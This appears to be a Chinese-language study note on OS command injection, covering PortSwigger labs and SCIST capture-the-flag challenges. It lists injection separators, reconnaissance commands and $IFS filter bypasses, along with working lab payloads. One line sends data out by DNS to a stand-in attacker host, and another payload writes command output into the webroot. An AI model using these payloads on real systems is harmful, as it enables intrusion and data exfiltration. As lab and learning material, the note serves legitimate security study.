# Command Injection

https://portswigger.net/web-security/os-command-injection

有些 application 在後端會直接使用 shell 來幫忙完成一些指令，當輸入沒有被好好過濾，就會發生 command injection

常見 payload
- `&` ：將指令做分隔
- `;`：不管前面，一定會執行後面
- `||`：前面失敗才執行後面
- `&&`：前面成功才執行後面
- `\n`：換行

關閉 command
- `"`、`'`
- ``` ` ```、`$(`

當有 command injection 發生時，可以用這些指令來得到更多的資訊


|purpose|Linux|Window|
|-------|-----|------|
|Name of current user|whoami|whoami|
|Operating system| uname -a| ver|
|Network configuration| ifconfig|ipconfig /all|
|Network connections|netstat -an|netstat -an|
|Running processes|ps -ef|tasklist|

## Blind Command Injection
有時候 sever 不會直接把整個 command 得到的結果回傳
- 透過 time delay 去得知一些資訊
    - `ping -c 10 127.0.0.1`：讓 sever ping 自己 ping 10 秒
- 將結果重導向到一個我們 access 的到的檔案
    - `whoami > /var/www/static/whoami.txt`
- 用 dns lookup 來讓 sever 對我們的 ip 發出 dns request
    - `& nslookup `whoami`.kgji2ohoyw.web-attacker.com &`
### Lab1
目標：執行 `whoami` <br>
攔截封包(放到 repeater 去送 request 會更方便)並且修改 payload，發現可以成功執行 `ls`
```
productId=1%26ls||&storeId=2
```
- `&` 會被解析為分隔符號，所以做 urlencode
- 利用 `||` 來讓後面無法成功執行的內容不執行


把 `ls` 改成 `whoami` 就可以完成 lab 了

### Lab2
目標：讓 sever delay 10 秒

題目有說是 feedback function 有 command injection 漏洞，因此就試著對 command 進行注入，以下是一個可能的寄信程式會用的 command
```
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```
由此可知，我們可以對 email 進行注入

payload:
```
name=123&email=123%26ping -c 10 127.0.0.1%26%40456&subject=123&message=123
```
- 注入`ping -c 10 127.0.0.1` 讓 sever ping 自己 ping 10 秒

### Lab3
目標：注入 whoami 並且找到 user

1. 攔截封包並且注入 payload
2. 到 /image?filename=y.txt 讀檔

payload
```
&name=123&email=123%40456%26ls>/var/www/images/y.txt%26&subject=123&message=123
```
> %26ls>/var/www/images/y.txt%26
- urlencode `&` : %26
- 我們可以上傳檔案到 /var/www/images/ 並且透過 url: /image?filename=y.txt 讀檔(看其他 image 讀取的方法得知)


### SICST Dig blind2
一個有 command injection 漏洞的網站，但 sever 不會回傳查詢值，所以只能透過回傳的 success 和 fail 來判斷以及找 flag

payload
```
example.com'&&cat /flag|grep SCIST{
```
- 把 flag 印出來，並且查看 flag 是否有 substr `SCIST{`
- 使用 `&&` 讓 grep 有成功找到時回傳 success
- 使用 [script](dig_expolit.py) 暴搜找 grep 的 prefix

### SCIST Dig Waf5
- ``` `ls` ```
- ``` `$PWD` ```
- ``` `$HOME` ```
- ``` `expr$IFS\substr$IFS$PWD$IFS\1$IFS\1` ```

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- $IFS: bypass 空白

想法越鑽越遠QQ
